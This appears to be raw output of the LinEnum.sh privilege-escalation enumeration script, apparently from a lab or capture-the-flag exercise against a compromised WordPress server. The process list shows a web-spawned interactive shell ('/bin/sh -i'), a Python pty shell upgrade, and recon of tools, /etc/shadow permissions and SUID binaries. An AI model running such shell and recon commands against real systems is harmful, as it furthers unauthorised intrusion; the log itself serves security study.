+root        153  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/16]
+root        154  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/17]
+root        155  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/18]
+root        156  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/19]
+root        157  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/20]
+root        158  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/21]
+root        159  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/22]
+root        160  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/23]
+root        161  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/24]
+root        162  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/25]
+root        163  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/26]
+root        164  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/27]
+root        165  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/28]
+root        166  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/29]
+root        167  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/30]
+root        168  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/31]
+root        169  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/32]
+root        170  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/33]
+root        171  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/34]
+root        172  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/35]
+root        173  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/36]
+root        174  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/37]
+root        175  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/38]
+root        176  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/39]
+root        177  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/40]
+root        178  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/41]
+root        179  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/42]
+root        180  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/43]
+root        181  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/44]
+root        182  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/45]
+root        183  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/46]
+root        184  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/47]
+root        185  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/48]
+root        186  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/49]
+root        187  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/50]
+root        188  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/51]
+root        189  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/52]
+root        190  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/53]
+root        191  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/54]
+root        192  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/55]
+root        193  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/56]
+root        194  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/57]
+root        195  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/58]
+root        196  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/59]
+root        197  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/60]
+root        198  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/61]
+root        199  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/62]
+root        200  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/63]
+root        201  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/64]
+root        202  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/65]
+root        203  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/66]
+root        204  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/67]
+root        205  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/68]
+root        206  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/69]
+root        207  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/70]
+root        208  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/71]
+root        209  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/72]
+root        210  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/73]
+root        211  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/74]
+root        212  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/75]
+root        213  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/76]
+root        214  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/77]
+root        215  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/78]
+root        216  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/79]
+root        217  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/80]
+root        218  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/81]
+root        219  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/82]
+root        220  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/83]
+root        221  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/84]
+root        222  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/85]
+root        223  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/86]
+root        224  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/87]
+root        225  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/88]
+root        226  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/89]
+root        227  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/90]
+root        228  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/91]
+root        229  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/92]
+root        230  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/93]
+root        231  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/94]
+root        232  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/95]
+root        233  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/96]
+root        234  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/97]
+root        235  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/98]
+root        236  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/99]
+root        237  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/100]
+root        238  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/101]
+root        239  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/102]
+root        240  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/103]
+root        241  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/104]
+root        242  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/105]
+root        243  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/106]
+root        244  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/107]
+root        245  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/108]
+root        246  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/109]
+root        247  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/110]
+root        248  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/111]
+root        249  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/112]
+root        250  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/113]
+root        251  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/114]
+root        252  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/115]
+root        253  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/116]
+root        254  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/117]
+root        255  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/118]
+root        256  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/119]
+root        257  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/120]
+root        258  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/121]
+root        259  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/122]
+root        260  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/123]
+root        261  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/124]
+root        262  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/125]
+root        263  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/126]
+root        264  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/127]
+root        265  0.0  0.0      0     0 ?        S    04:14   0:00 [migration/0]
+root        266  0.0  0.0      0     0 ?        S    04:14   0:01 [watchdog/0]
+root        267  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [khelper]
+root        268  0.0  0.0      0     0 ?        S    04:14   0:00 [kdevtmpfs]
+root        269  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [netns]
+root        270  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [writeback]
+root        271  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kintegrityd]
+root        272  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [bioset]
+root        273  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kworker/u257:0]
+root        274  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kblockd]
+root        275  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [ata_sff]
+root        276  0.0  0.0      0     0 ?        S    04:14   0:00 [khubd]
+root        277  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [md]
+root        278  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [devfreq_wq]
+root        279  0.0  0.0      0     0 ?        S    04:14   0:07 [kworker/0:1]
+root        281  0.0  0.0      0     0 ?        S    04:14   0:00 [khungtaskd]
+root        282  0.0  0.0      0     0 ?        S    04:14   0:07 [kswapd0]
+root        283  0.0  0.0      0     0 ?        SN   04:14   0:00 [ksmd]
+root        284  0.0  0.0      0     0 ?        S    04:14   0:00 [fsnotify_mark]
+root        285  0.0  0.0      0     0 ?        S    04:14   0:00 [ecryptfs-kthrea]
+root        286  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [crypto]
+root        298  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kthrotld]
+root        300  0.0  0.0      0     0 ?        S    04:14   0:00 [scsi_eh_0]
+root        301  0.0  0.0      0     0 ?        S    04:14   0:00 [scsi_eh_1]
+root        303  0.0  0.0      0     0 ?        S    04:14   0:04 [kworker/u256:3]
+root        322  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [deferwq]
+root        323  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [charger_manager]
+root        326  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kworker/u257:2]
+root        379  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kpsmoused]
+root        380  0.0  0.0      0     0 ?        S    04:14   0:00 [kworker/0:2]
+root        386  0.0  0.0      0     0 ?        S    04:14   0:08 [jbd2/sda1-8]
+root        387  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [ext4-rsv-conver]
+root        536  0.0  0.0  19472   260 ?        S    04:14   0:00 upstart-udev-bridge --daemon
+root        542  0.0  0.0  50000   204 ?        Ds   04:14   0:00 /lib/systemd/systemd-udevd --daemon
+root        615  0.0  0.0  15272   284 ?        S    04:14   0:00 upstart-file-bridge --daemon
+syslog      621  0.0  0.0 255840   316 ?        Ssl  04:14   0:01 rsyslogd
+root       1507  0.0  0.0  15256   248 ?        S    04:14   0:00 upstart-socket-bridge --daemon
+root       1576  0.0  0.0  23536    56 ?        Ss   04:14   0:00 /usr/sbin/vsftpd
+root       1623  0.0  0.0  14536     8 tty4     Ss+  04:14   0:00 /sbin/getty -8 38400 tty4
+root       1625  0.0  0.0  14536     8 tty5     Ss+  04:14   0:00 /sbin/getty -8 38400 tty5
+root       1627  0.0  0.0  14536     8 tty2     Ss+  04:14   0:00 /sbin/getty -8 38400 tty2
+root       1628  0.0  0.0  14536     8 tty3     Ss+  04:14   0:00 /sbin/getty -8 38400 tty3
+root       1630  0.0  0.0  14536     8 tty6     Ss+  04:14   0:00 /sbin/getty -8 38400 tty6
+root       1647  0.0  0.0  23652    60 ?        Ss   04:14   0:00 cron
+root       1793  0.0  0.0   4440     4 ?        S    04:14   0:00 /bin/sh /opt/bitnami/mysql/bin/mysqld_safe --defaults-file=/opt/bitnami/mysql/my.cnf --port=3306 --socket=/opt/bitnami/mysql/tmp/mysql.sock --datadir=/opt/bitnami/mysql/data --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --lower-case-table-names=1
+mysql      2080  1.5  9.0 1306892 44232 ?       Sl   04:14  16:11 /opt/bitnami/mysql/bin/mysqld.bin --defaults-file=/opt/bitnami/mysql/my.cnf --basedir=/opt/bitnami/mysql --datadir=/opt/bitnami/mysql/data --plugin-dir=/opt/bitnami/mysql/lib/plugin --user=mysql --lower-case-table-names=1 --log-error=/opt/bitnami/mysql/data/mysqld.log --pid-file=/opt/bitnami/mysql/data/mysqld.pid --socket=/opt/bitnami/mysql/tmp/mysql.sock --port=3306
+root       2133  0.0  0.4 166168  2060 ?        Sl   04:14   0:32 /usr/sbin/vmtoolsd
+root       2210  0.0  0.1 258616   880 ?        Ss   04:14   0:01 php-fpm: master process (/opt/bitnami/php/etc/php-fpm.conf)                                                                                                                                                                                                                          
+root       2217  0.0  1.8 207948  8824 ?        Ss   04:14   0:01 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+daemon     2219  0.1  4.8 999184 23716 ?        Sl   04:14   1:53 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+daemon     2220  0.2  4.9 991072 24148 ?        Sl   04:14   2:11 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+daemon     2221  0.2  5.0 999328 24588 ?        Sl   04:14   2:06 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+root       2365  0.0  0.1 104380   804 ?        Sl   04:14   0:03 /usr/bin/monit -c /etc/monit/monitrc
+root       2390  0.0  0.0  14536   316 tty1     Ss+  04:14   0:00 /sbin/getty -8 38400 tty1
+daemon     2458  0.7  4.9 999184 24216 ?        Sl   04:30   7:29 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+root       2507  0.0  0.0      0     0 ?        S    04:31   0:00 [kauditd]
+daemon     3303  0.8  5.3 999176 26312 ?        Sl   08:40   6:15 /opt/bitnami/apache2/bin/httpd.bin -f /opt/bitnami/apache2/conf/httpd.conf -DDISABLE_BANNER
+daemon     3984  1.5  8.9 267352 43808 ?        S    10:33  10:15 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+root       4714  0.0  0.5  10220  2824 ?        Ss   21:04   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
+root       4760  0.0  0.0      0     0 ?        S    21:07   0:00 [kworker/u256:0]
+daemon     4761  3.2  8.3 268096 40700 ?        S    21:10   0:35 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4762  3.1  6.6 263040 32396 ?        S    21:10   0:33 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4774  0.0  5.0 267352 24528 ?        Ss   21:23   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4775  0.0  4.8 268096 23856 ?        Ss   21:23   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4776  0.0  4.2 263040 20704 ?        Ss   21:23   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4777  0.0  4.5 267352 22116 ?        Ss   21:24   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4778  0.0  2.3 267352 11508 ?        Ss   21:25   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4779  0.0  2.2 267352 10928 ?        Ss   21:25   0:00 php-fpm: pool wordpress                                                                                                                                                                                                                                                              
+daemon     4780  0.0  0.1   4440   652 ?        S    21:25   0:00 sh -c uname -a; w; id; /bin/sh -i
+daemon     4784  0.0  0.1   4440   656 ?        S    21:25   0:00 /bin/sh -i
+daemon     4786  0.0  1.0  31916  5056 ?        S    21:26   0:00 python -c import pty; pty.spawn('/bin/bash')
+daemon     4787  0.0  0.3  18136  1932 pts/0    Ss   21:26   0:00 /bin/bash
+daemon     4800  0.0  0.5  18944  2448 pts/0    S+   21:28   0:00 /bin/bash ./LinEnum.sh
+daemon     4801  0.0  0.4  19016  1972 pts/0    S+   21:28   0:00 /bin/bash ./LinEnum.sh
+daemon     4802  0.0  0.0   4344   356 pts/0    S+   21:28   0:00 tee -a
+daemon     4976  0.0  0.3  18968  1672 pts/0    S+   21:28   0:00 /bin/bash ./LinEnum.sh
+daemon     4977  0.0  0.2  15564  1160 pts/0    R+   21:28   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root  1021112 Oct  7  2014 /bin/bash
+lrwxrwxrwx 1 root root        4 Feb 19  2014 /bin/sh -&gt; dash
+-rwxr-xr-x 1 root root   239896 Apr 15  2015 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root   678528 Sep  7  2015 /opt/bitnami/apache2/bin/httpd.bin
+-rwxr-xr-x 1 root root 13966352 Sep  7  2015 /opt/bitnami/mysql/bin/mysqld.bin
+-rwxr-xr-x 2 root root    32112 Feb 12  2015 /sbin/getty
+-rwxr-xr-x 1 root root   265848 Jul 18  2014 /sbin/init
+-rwxr-xr-x 1 root root   534728 Nov 17  2013 /usr/bin/monit
+lrwxrwxrwx 1 root root       37 Nov 13  2015 /usr/sbin/vmtoolsd -&gt; /usr/lib/vmware-tools/sbin64/vmtoolsd
+-rwxr-xr-x 1 root root   164072 May  1  2014 /usr/sbin/vsftpd
+
+
+[-] /etc/init.d/ binary permissions:
+total 148
+drwxr-xr-x  2 root root 4096 Sep 16  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root    0 Jun 24  2015 .legacy-bootordering
+-rw-r--r--  1 root root 2427 Mar 13  2014 README
+-rwxr-xr-x  1 root root 1333 Sep 16  2015 bitnami
+-rwxr-xr-x  1 root root 1919 Jan 18  2011 console-setup
+lrwxrwxrwx  1 root root   21 Feb  9  2013 cron -&gt; /lib/init/upstart-job
+-rwxr-xr-x  1 root root 1105 May 13  2015 grub-common
+-rwxr-xr-x  1 root root 1329 Mar 13  2014 halt
+-rwxr-xr-x  1 root root 1293 Mar 13  2014 killprocs
+-rwxr-xr-x  1 root root 1990 Jan 22  2013 kmod
+-rwxr-xr-x  1 root root 2664 Nov 16  2013 monit
+-rwxr-xr-x  1 root root 4479 Mar 20  2014 networking
+-rwxr-xr-x  1 root root 1346 Mar 13  2015 ondemand
+-rwxr-xr-x  1 root root 1192 May 27  2013 procps
+-rwxr-xr-x  1 root root 6120 Mar 13  2014 rc
+-rwxr-xr-x  1 root root  782 Mar 13  2014 rc.local
+-rwxr-xr-x  1 root root  117 Mar 13  2014 rcS
+-rwxr-xr-x  1 root root  639 Mar 13  2014 reboot
+-rwxr-xr-x  1 root root 2918 Jun 13  2014 resolvconf
+-rwxr-xr-x  1 root root 4395 Apr 17  2014 rsync
+-rwxr-xr-x  1 root root 2913 Dec  4  2013 rsyslog
+-rwxr-xr-x  1 root root 1226 Jul 22  2013 screen-cleanup
+-rwxr-xr-x  1 root root 3920 Mar 13  2014 sendsigs
+-rwxr-xr-x  1 root root  590 Mar 13  2014 single
+-rw-r--r--  1 root root 4290 Mar 13  2014 skeleton
+-rwxr-xr-x  1 root root 4077 May  2  2014 ssh
+-rwxr-xr-x  1 root root  731 Feb  5  2014 sudo
+-rwxr-xr-x  1 root root 6173 Apr 14  2014 udev
+-rwxr-xr-x  1 root root 2721 Mar 13  2014 umountfs
+-rwxr-xr-x  1 root root 2260 Mar 13  2014 umountnfs.sh
+-rwxr-xr-x  1 root root 1872 Mar 13  2014 umountroot
+-rwxr-xr-x  1 root root 3111 Mar 13  2014 urandom
+-rwxr-xr-x  1 root root 2666 Oct  8  2014 x11-common
+
+
+[-] /etc/init/ config file permissions:
+total 316
+drwxr-xr-x  2 root root 4096 Nov 13  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root  328 Feb 22  2014 bootmisc.sh.conf
+-rw-r--r--  1 root root  232 Feb 22  2014 checkfs.sh.conf
+-rw-r--r--  1 root root  253 Feb 22  2014 checkroot-bootclean.sh.conf
+-rw-r--r--  1 root root  307 Feb 22  2014 checkroot.sh.conf
+-rw-r--r--  1 root root  250 Oct  9  2012 console-font.conf
+-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf
+-rw-r--r--  1 root root  266 Apr 11  2014 console.conf
+-rw-r--r--  1 root root 1122 Apr 11  2014 container-detect.conf
+-rw-r--r--  1 root root  356 Apr 11  2014 control-alt-delete.conf
+-rw-r--r--  1 root root  297 Feb  9  2013 cron.conf
+-rw-r--r--  1 root root  273 Nov 19  2010 dmesg.conf
+-rw-r--r--  1 root root 1377 Apr 11  2014 failsafe.conf
+-rw-r--r--  1 root root  267 Apr 11  2014 flush-early-job-log.conf
+-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
+-rw-r--r--  1 root root  444 Apr 16  2014 hwclock-save.conf
+-rw-r--r--  1 root root  557 Apr 16  2014 hwclock.conf
+-rw-r--r--  1 root root  689 Apr 10  2014 kmod.conf
+-rw-r--r--  1 root root  268 Feb 22  2014 mountall-bootclean.sh.conf
+-rw-r--r--  1 root root  349 Feb 22  2014 mountall-net.conf
+-rw-r--r--  1 root root  261 Feb 22  2014 mountall-reboot.conf
+-rw-r--r--  1 root root 1201 Feb 22  2014 mountall-shell.conf
+-rw-r--r--  1 root root 1232 Feb 22  2014 mountall.conf
+-rw-r--r--  1 root root  311 Feb 22  2014 mountall.sh.conf
+-rw-r--r--  1 root root  327 Feb 22  2014 mountdevsubfs.sh.conf
+-rw-r--r--  1 root root  405 Feb 22  2014 mounted-debugfs.conf
+-rw-r--r--  1 root root  730 Feb 22  2014 mounted-dev.conf
+-rw-r--r--  1 root root  480 Feb 22  2014 mounted-proc.conf
+-rw-r--r--  1 root root  618 Feb 22  2014 mounted-run.conf
+-rw-r--r--  1 root root 1890 Feb 22  2014 mounted-tmp.conf
+-rw-r--r--  1 root root  903 Feb 22  2014 mounted-var.conf
+-rw-r--r--  1 root root  323 Feb 22  2014 mountkernfs.sh.conf
+-rw-r--r--  1 root root  249 Feb 22  2014 mountnfs-bootclean.sh.conf
+-rw-r--r--  1 root root  313 Feb 22  2014 mountnfs.sh.conf
+-rw-r--r--  1 root root  238 Feb 22  2014 mtab.sh.conf
+-rw-r--r--  1 root root  530 Mar 20  2014 network-interface-container.conf
+-rw-r--r--  1 root root 1756 May  4  2013 network-interface-security.conf
+-rw-r--r--  1 root root 1109 May  8  2014 network-interface.conf
+-rw-r--r--  1 root root 2493 Mar 20  2014 networking.conf
+-rw-r--r--  1 root root  534 Feb 17  2014 passwd.conf
+-rw-r--r--  1 root root  326 Mar 13  2014 plymouth-log.conf
+-rw-r--r--  1 root root  675 Mar 13  2014 plymouth-ready.conf
+-rw-r--r--  1 root root  778 Mar 13  2014 plymouth-shutdown.conf
+-rw-r--r--  1 root root  899 Mar 13  2014 plymouth-splash.conf
+-rw-r--r--  1 root root  796 Mar 13  2014 plymouth-stop.conf
+-rw-r--r--  1 root root  421 Apr 11  2014 plymouth-upstart-bridge.conf
+-rw-r--r--  1 root root  519 Mar 13  2014 plymouth.conf
+-rw-r--r--  1 root root  363 Jan  6  2014 procps.conf
+-rw-r--r--  1 root root 1543 Apr 11  2014 rc-sysinit.conf
+-rw-r--r--  1 root root  661 Apr 11  2014 rc.conf
+-rw-r--r--  1 root root  683 Apr 11  2014 rcS.conf
+-rw-r--r--  1 root root  457 Dec 13  2012 resolvconf.conf
+-rw-r--r--  1 root root  426 Apr 18  2013 rsyslog.conf
+-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf
+-rw-r--r--  1 root root  277 Apr 11  2014 shutdown.conf
+-rw-r--r--  1 root root  641 May  2  2014 ssh.conf.back
+-rw-r--r--  1 root root  711 Mar 13  2014 startpar-bridge.conf
+-rw-r--r--  1 root root  348 Apr 11  2014 tty1.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty2.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty3.conf
+-rw-r--r--  1 root root  333 Apr 11  2014 tty4.conf
+-rw-r--r--  1 root root  232 Apr 11  2014 tty5.conf
+-rw-r--r--  1 root root  232 Apr 11  2014 tty6.conf
+-rw-r--r--  1 root root  645 Sep 12  2014 udev-fallback-graphics.conf
+-rw-r--r--  1 root root  768 Apr 14  2014 udev-finish.conf
+-rw-r--r--  1 root root  337 Apr 14  2014 udev.conf
+-rw-r--r--  1 root root  356 Apr 14  2014 udevmonitor.conf
+-rw-r--r--  1 root root  352 Apr 14  2014 udevtrigger.conf
+-rw-r--r--  1 root root  473 Feb 28  2014 ufw.conf
+-rw-r--r--  1 root root  412 Apr 11  2014 upstart-file-bridge.conf
+-rw-r--r--  1 root root  329 Apr 11  2014 upstart-socket-bridge.conf
+-rw-r--r--  1 root root  553 Apr 11  2014 upstart-udev-bridge.conf
+-rw-r--r--  1 root root  683 Mar 25  2013 ureadahead-other.conf
+-rw-r--r--  1 root root  889 Mar 25  2013 ureadahead.conf
+-rw-r--r--  1 root root  351 Nov 13  2015 vmware-tools-thinprint.conf
+-r--r--r--  1 root root  901 Nov 13  2015 vmware-tools.conf
+-rw-r--r--  1 root root  737 May 16  2013 vsftpd.conf
+-rw-r--r--  1 root root 1521 Apr 11  2014 wait-for-state.conf
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 240K
+drwxr-xr-x 4 root root 4.0K Jun 24  2015 system
+-rwxr-xr-x 1 root root 235K Apr 15  2015 systemd-udevd
+
+/lib/systemd/system:
+total 52K
+drwxr-xr-x 2 root root 4.0K Jun 24  2015 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Jun 24  2015 sysinit.target.wants
+-rw-r--r-- 1 root root  199 May  6  2015 rsyslog.service
+lrwxrwxrwx 1 root root   21 Apr 15  2015 udev.service -&gt; systemd-udevd.service
+-rw-r--r-- 1 root root  823 Apr 15  2015 systemd-udev-settle.service
+-rw-r--r-- 1 root root  715 Apr 15  2015 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  788 Apr 15  2015 systemd-udevd.service
+-rw-r--r-- 1 root root  578 Apr 15  2015 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  575 Apr 15  2015 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  344 May  2  2014 ssh.service
+-rw-r--r-- 1 root root  216 May  2  2014 ssh.socket
+-rw-r--r-- 1 root root  196 May  2  2014 ssh@.service
+-rw-r--r-- 1 root root  188 Apr 17  2014 rsync.service
+-rw-r--r-- 1 root root  272 Feb  5  2014 sudo.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Apr 15  2015 systemd-udevd-control.socket -&gt; ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Apr 15  2015 systemd-udevd-kernel.socket -&gt; ../systemd-udevd-kernel.socket
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Apr 15  2015 systemd-udev-trigger.service -&gt; ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 24 Apr 15  2015 systemd-udevd.service -&gt; ../systemd-udevd.service
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.9p5
+
+
+[-] MYSQL version:
+/opt/bitnami/mysql/bin/mysql.bin  Ver 14.14 Distrib 5.6.26, for linux-glibc2.5 (x86_64) using  EditLine wrapper
+
+
+[-] Apache version:
+Server version: Apache/2.4.16 (Unix)
+Server built:   Sep  7 2015 11:15:20
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/opt/bitnami/common/bin/curl
+
+
+[-] Installed compilers:
+ii  g++                             4:4.8.2-1ubuntu6                 amd64        GNU C++ compiler
+ii  g++-4.8                         4.8.4-2ubuntu1~14.04             amd64        GNU C++ compiler
+ii  gcc                             4:4.8.2-1ubuntu6                 amd64        GNU C compiler
+ii  gcc-4.8                         4.8.4-2ubuntu1~14.04             amd64        GNU C compiler
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1217 Nov 13  2015 /etc/passwd
+-rw-r--r-- 1 root root 604 Nov 13  2015 /etc/group
+-rw-r--r-- 1 root root 665 Feb 20  2014 /etc/profile
+-rw-r----- 1 root shadow 982 Nov 14  2015 /etc/shadow
+
+
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
+-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
